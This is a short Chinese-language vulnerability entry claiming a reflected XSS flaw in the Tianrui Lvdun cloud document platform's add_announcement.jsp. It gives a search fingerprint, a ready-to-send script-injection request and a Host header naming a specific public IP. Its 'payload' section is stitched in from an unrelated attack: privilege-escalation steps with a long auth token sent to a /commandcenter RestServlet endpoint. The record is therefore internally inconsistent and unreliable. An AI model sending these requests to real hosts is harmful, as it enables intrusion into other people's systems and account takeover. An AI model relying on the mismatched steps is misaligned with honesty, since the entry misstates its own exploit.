# 天锐绿盘云文档安全管理平台add_announcement.jsp存在XSS漏洞

- **系统**：天锐绿盾　|　**类型**：XSS　|　**CVE**：—
- **指纹**：`body="/lddsm/"`
- **请求**：`GET /lddsm/frontend/manage/announcement/add_announcement.jsp?mode=add'</script><script>alert(document.domain);</script><script>// HTTP/1.1`
- **关键头**：`Host: 183.242.32.10:8180`

**请求体 / payload**
```
此时回显的便为token，此时token为低权限数据权限
Step3 提权
Authtoken为step2返回值
GET /commandcenter/RestServlet/Database/GetUmUserById/1 HTTP/1.1
Host:
Authtoken: QSDK 3ce4460b10eb59af4c6db51bd02caf897deb8ec229277d62336db2bf6f5a3a8582112e314165be5bf6ce9eeb5d990302375ac4c6dd2a09685b1cf29b3441d9b47cf0fe59cc0275eb9e741bcc7e08256483201d6ae4a58268a6a3aed4e47e44b5db7cbf0cced7579a3aaf23de66ab78ea21fdba68378247ab666c792b054377ea52ce7f5bd82b7f6f8109d09a7b60cadda98ee56fd37c80d897bb3e7e5587112fab9eb3f5e4ba8b6ec9404cd777ea40d86b32f86559037f0e3b6530ed981ba36c7ff65a406f28e5130c59c21eaa66c46cf85ece067090d3373
```
- **预期**：200　|　—